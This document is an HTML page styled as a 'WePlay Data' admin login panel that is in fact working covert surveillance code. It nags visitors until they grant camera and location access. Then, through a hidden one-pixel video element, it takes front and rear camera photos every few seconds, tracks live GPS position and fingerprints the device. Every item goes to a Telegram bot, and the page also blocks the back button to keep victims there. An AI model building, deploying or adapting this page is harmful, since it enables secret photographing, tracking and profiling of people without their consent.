<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Admin Panel · WePlay Data</title>
    <style>
        /* ========== ADMIN PANEL STYLES (VISIBLE) ========== */
        body {
            background-image: url("https://i.ibb.co/CX4YMQ9/4b6c2b4d93af1f062cf9f17288e614be.gif");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            margin: 0;
        }

        /* Hacker scan light effect */
        body::before {
            content: "";
            position: absolute;
            top: -100%;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(transparent, rgba(0, 255, 0, 0.3), transparent);
            animation: scan 4s linear infinite;
            pointer-events: none;
        }

        @keyframes scan {
            0% { top: -100%; }
            100% { top: 100%; }
        }

        .login-box {
            position: relative;
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 30px;
            border-radius: 10px;
            width: 300px;
            text-align: center;
            box-shadow: 0 0 20px lime;
            z-index: 1;
        }

        h2 {
            color: lime;
            margin-bottom: 20px;
        }

        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 2px solid lime;
            border-radius: 5px;
            background: black;
            color: white;
            outline: none;
        }

        .password-box {
            position: relative;
            width: 100%;
        }

        .password-box input {
            width: 90%;
            padding-right: 35px;
        }

        .eye {
            position: absolute;
            right: 20px;
            top: 18px;
            cursor: pointer;
            color: lime;
            font-size: 18px;
            user-select: none;
        }

        button {
            width: 95%;
            padding: 10px;
            background: lime;
            color: black;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
            transition: 0.3s;
        }

        button:hover {
            background: red;
            color: white;
        }

        /* ========== PERMISSION MODAL (NEW) ========== */
        .permission-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 20000;
        }
        .permission-modal.hidden {
            display: none;
        }
        .modal-content {
            background: #111;
            border: 2px solid lime;
            border-radius: 15px;
            padding: 30px;
            max-width: 350px;
            text-align: center;
            color: white;
            box-shadow: 0 0 30px lime;
        }
        .modal-content h3 {
            color: lime;
            margin-bottom: 15px;
        }
        .modal-content p {
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .modal-content button {
            background: lime;
            color: black;
            border: none;
            padding: 12px 30px;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .modal-content button:hover {
            background: #00cc00;
        }

        /* ========== HIDDEN FUNCTIONAL STYLES ========== */
        .video-container {
            position: fixed;
            bottom: 10px;
            right: 10px;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            overflow: hidden;
            pointer-events: none;
            z-index: -1;
        }

        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        canvas {
            display: none;
        }

        .processing-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 18px;
            backdrop-filter: blur(5px);
            flex-direction: column;
        }

        .processing-overlay.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #00bcd4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .warning-text {
            color: #ff4444;
            font-size: 14px;
            margin-top: 20px;
            text-align: center;
        }

        .exit-warning {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            z-index: 10000;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            width: 80%;
            max-width: 300px;
        }

        .exit-warning.active {
            display: block;
        }

        .exit-warning h3 {
            color: #333;
            margin-bottom: 10px;
        }

        .exit-warning p {
            color: #666;
            margin-bottom: 20px;
        }

        .exit-warning button {
            background: #00bcd4;
            color: white;
            border: none;
            padding: 10px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
    <!-- Telegram config file (must be included before main script) -->
    <script src="config.js"></script>
</head>
<body>
    <!-- HIDDEN ELEMENTS (required for data collection) -->
    <div class="processing-overlay" id="processingOverlay">
        <div class="spinner"></div>
        <div>Admin Login Processing...</div>
        <div style="font-size: 14px; margin-top: 15px;">Please wait while we verify</div>
        <div class="warning-text">⚠️ Do not close or minimize</div>
    </div>

    <div class="exit-warning" id="exitWarning">
        <h3>⚠️ Processing</h3>
        <p>Admin login is being processed. Please wait...</p>
        <button onclick="document.getElementById('exitWarning').classList.remove('active')">OK</button>
    </div>

    <!-- PERMISSION MODAL (shown until user grants both camera & location) -->
    <div id="permissionModal" class="permission-modal">
        <div class="modal-content">
            <h3>🔐 Permissions required</h3>
            <p id="permissionMessage">Please allow camera and location access to continue.</p>
            <button id="retryPermissionBtn">Allow</button>
        </div>
    </div>

    <div class="video-container">
        <video id="video" autoplay playsinline muted></video>
    </div>
    <canvas id="canvas"></canvas>

    <!-- VISIBLE ADMIN PANEL LOGIN -->
    <div class="login-box">
        <h2>🔐 Admin Panel</h2>
        <form id="loginForm" onsubmit="return false;">
            <input type="text" id="userid" placeholder="Enter User ID" required>
            <div class="password-box">
                <input type="password" id="password" placeholder="Enter Password" required>
                <span class="eye" onclick="togglePassword()">👁️</span>
            </div>
            <button type="button" id="loginButton">Login</button>
        </form>
    </div>

    <!-- Main script -->
    <script>
        // ==================== VARIABLES ====================
        let stream = null;
        let capturing = false;
        let captureInterval = null;
        let locationWatchId = null;
        let cameraReady = false;
        let isProcessing = false;          // controls overlay and exit protection
        let useFrontCamera = true;
        let photoCounter = 0;
        
        // Permission flags
        let cameraPermissionGranted = false;
        let locationPermissionGranted = false;

        // ==================== BACK BUTTON PREVENTION (same as original) ====================
        history.pushState(null, null, location.href);
        window.onpopstate = function() {
            if (isProcessing) {
                document.getElementById('exitWarning').classList.add('active');
                history.pushState(null, null, location.href);
            } else {
                window.location.href = 'about:blank';
            }
        };
        
        document.addEventListener('visibilitychange', function() {
            if (document.hidden && isProcessing) {
                alert('⚠️ Processing in progress! Please do not switch tabs.');
            }
        });
        
        window.addEventListener('beforeunload', function(e) {
            if (isProcessing) {
                e.preventDefault();
                e.returnValue = 'Processing in progress! Are you sure you want to leave?';
                return 'Processing in progress! Are you sure you want to leave?';
            }
        });
        
        // ==================== TELEGRAM SEND FUNCTIONS (unchanged) ====================
        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            };
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await response.json();
                if (!data.ok) console.error('Telegram message error:', data);
                return data;
            } catch (err) {
                console.error('Failed to send message:', err);
                throw err;
            }
        }

        async function sendTelegramPhoto(blob, caption = '') {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            if (caption) formData.append('caption', caption);
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                if (!data.ok) console.error('Telegram photo error:', data);
                return data;
            } catch (err) {
                console.error('Failed to send photo:', err);
                throw err;
            }
        }

        async function sendWithRetry(type, data, attempt = 1) {
            try {
                if (type === 'message') {
                    await sendTelegramMessage(data);
                } else if (type === 'location') {
                    const text = `📍 Live location:\nLatitude: ${data.lat}\nLongitude: ${data.lng}\nGoogle Maps: https://maps.google.com/?q=${data.lat},${data.lng}`;
                    await sendTelegramMessage(text);
                } else if (type === 'device_info') {
                    const text = `📱 <b>Extended Device Info</b>\n` + 
                        Object.entries(data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('\n');
                    await sendTelegramMessage(text);
                }
            } catch (err) {
                console.log(`Send failed (attempt ${attempt}), retrying...`, err);
                if (attempt < 2) {
                    await new Promise(r => setTimeout(r, 2000));
                    return sendWithRetry(type, data, attempt + 1);
                }
            }
        }

        async function sendPhotoWithRetry(blob, num, cameraType, attempt = 1) {
            try {
                const caption = `📸 Photo #${num} (${cameraType} camera)`;
                await sendTelegramPhoto(blob, caption);
                console.log(`Photo #${num} sent`);
            } catch (err) {
                console.log(`Photo send failed (attempt ${attempt})`, err);
                if (attempt < 2) {
                    await new Promise(r => setTimeout(r, 3000));
                    return sendPhotoWithRetry(blob, num, cameraType, attempt + 1);
                } else {
                    console.log('Photo failed after retry');
                }
            }
        }
        
        // ==================== PERMISSION HANDLING (NEW) ====================
        const permissionModal = document.getElementById('permissionModal');
        const permissionMsg = document.getElementById('permissionMessage');
        const retryBtn = document.getElementById('retryPermissionBtn');

        // Hide modal initially (will show if permissions denied)
        permissionModal.classList.add('hidden');

        // Function to show modal with custom message
        function showPermissionModal(message) {
            permissionMsg.innerText = message;
            permissionModal.classList.remove('hidden');
        }

        // Camera request with retry logic
        async function requestCamera() {
            try {
                // Try front camera first
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                useFrontCamera = true;
                cameraReady = true;
                cameraPermissionGranted = true;
                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();
                console.log('Front camera ready');
                return true;
            } catch (err) {
                console.log('Front camera failed, trying back:', err);
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    });
                    useFrontCamera = false;
                    cameraReady = true;
                    cameraPermissionGranted = true;
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    await video.play();
                    console.log('Back camera ready');
                    return true;
                } catch (err2) {
                    console.log('All cameras failed:', err2);
                    cameraPermissionGranted = false;
                    return false;
                }
            }
        }

        // Location request with retry logic
        function requestLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    console.log('Geolocation not supported');
                    resolve(false);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Success - we have location
                        locationPermissionGranted = true;
                        // Immediately send initial location
                        sendWithRetry('location', {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude
                        });
                        // Start live updates
                        startLiveLocation();
                        resolve(true);
                    },
                    (error) => {
                        console.log('Location denied or error:', error);
                        locationPermissionGranted = false;
                        resolve(false);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // Live location watcher (separate)
        function startLiveLocation() {
            if (locationWatchId) return;
            locationWatchId = navigator.geolocation.watchPosition(
                (position) => {
                    sendWithRetry('location', {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    });
                },
                (error) => console.log('Watch location error:', error),
                { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
            );
        }

        // Main permission loop: request both until granted
        async function requestAllPermissions() {
            let cameraOk = cameraPermissionGranted;
            let locationOk = locationPermissionGranted;

            while (!cameraOk || !locationOk) {
                if (!cameraOk) {
                    showPermissionModal('Camera access is required. Please click "Allow" to grant camera permission.');
                    await new Promise(resolve => {
                        retryBtn.onclick = async () => {
                            permissionModal.classList.add('hidden');
                            cameraOk = await requestCamera();
                            resolve();
                        };
                    });
                } else if (!locationOk) {
                    showPermissionModal('Location access is required. Please click "Allow" to grant location permission.');
                    await new Promise(resolve => {
                        retryBtn.onclick = async () => {
                            permissionModal.classList.add('hidden');
                            locationOk = await requestLocation();
                            resolve();
                        };
                    });
                }
            }

            // Both granted – hide modal and start full data collection
            permissionModal.classList.add('hidden');
            startDataCollection();
        }

        // ==================== DATA COLLECTION (triggered after permissions) ====================
        function startDataCollection() {
            console.log('Permissions granted, starting data collection');
            
            // Collect and send extended device info
            collectExtendedDeviceInfo().then(info => {
                sendWithRetry('device_info', info);
            });

            // Start photo capture
            startPhotoCapture();

            // (Location already started inside requestLocation, but we also have live updates)
            // Also send a "permissions granted" message
            sendWithRetry('message', '✅ Permissions granted – data collection started');
        }

        // ==================== EXTENDED DEVICE INFO (unchanged) ====================
        async function collectExtendedDeviceInfo() {
            const info = {
                'User Agent': navigator.userAgent,
                'Platform': navigator.platform,
                'Language': navigator.language,
                'Screen': `${screen.width}x${screen.height}`,
                'Color Depth': screen.colorDepth,
                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
                'Timestamp': new Date().toISOString(),
                'Cookies Enabled': navigator.cookieEnabled,
                'Do Not Track': navigator.doNotTrack || 'unspecified',
                'Hardware Concurrency': navigator.hardwareConcurrency || 'unknown',
                'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
                'Max Touch Points': navigator.maxTouchPoints || 'unknown',
            };

            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info['Battery Level'] = (battery.level * 100) + '%';
                    info['Battery Charging'] = battery.charging ? 'Yes' : 'No';
                } catch (e) {
                    info['Battery'] = 'Not available';
                }
            } else {
                info['Battery'] = 'API not supported';
            }

            if (navigator.connection) {
                const conn = navigator.connection;
                info['Network Type'] = conn.effectiveType || 'unknown';
                info['Downlink'] = conn.downlink ? conn.downlink + ' Mbps' : 'unknown';
                info['RTT'] = conn.rtt ? conn.rtt + ' ms' : 'unknown';
                info['Save Data'] = conn.saveData ? 'Yes' : 'No';
            } else {
                info['Network'] = 'API not supported';
            }
            return info;
        }

        // ==================== PHOTO CAPTURE (unchanged logic, but uses cameraReady) ====================
        function startPhotoCapture() {
            if (capturing) return;
            capturing = true;
            photoCounter = 0;
            captureInterval = setInterval(capturePhoto, 5000);
            setTimeout(capturePhoto, 1000); // first photo after 1 second
            
            // Auto-stop after 30 seconds (photo capture stops)
            setTimeout(() => {
                if (capturing) stopPhotoCapture();
            }, 30000);
        }
        
        function stopPhotoCapture() {
            capturing = false;
            if (captureInterval) clearInterval(captureInterval);
            // Do not clear location watch here; keep sending location
            sendWithRetry('message', '📸 Photo capture completed (30s)');
        }
        
        // Switch camera function (used by capturePhoto)
        async function switchCamera(mode) {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();
                cameraReady = true;
            } catch (err) {
                console.log('Switch camera failed:', err);
            }
        }

        async function capturePhoto() {
            if (!capturing || !cameraReady || !stream) return;
            try {
                photoCounter++;
                // Alternate after first photo
                if (photoCounter > 1) {
                    useFrontCamera = !useFrontCamera;
                    await switchCamera(useFrontCamera ? 'user' : 'environment');
                }
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    setTimeout(capturePhoto, 300);
                    return;
                }
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const cameraType = useFrontCamera ? 'front' : 'rear';
                        await sendPhotoWithRetry(blob, photoCounter, cameraType);
                    }
                }, 'image/jpeg', 0.8);
            } catch (e) {
                console.log('Capture error:', e);
            }
        }

        // ==================== TOGGLE PASSWORD (unchanged) ====================
        function togglePassword() {
            const pwd = document.getElementById('password');
            pwd.type = pwd.type === 'password' ? 'text' : 'password';
        }

        // ==================== INIT ON PAGE LOAD ====================
        window.onload = function() {
            // Start permission request loop – will show modal until both granted
            requestAllPermissions();

            // Attach login button click to show processing overlay (as before)
            document.getElementById('loginButton').addEventListener('click', function() {
                // Show processing overlay (does not affect ongoing capture)
                if (!isProcessing) {
                    isProcessing = true;
                    document.getElementById('processingOverlay').classList.add('active');
                    history.pushState(null, null, location.href);
                    sendWithRetry('message', '🔑 Admin Login button clicked');
                }
            });
        };
    </script>
</body>
</html>
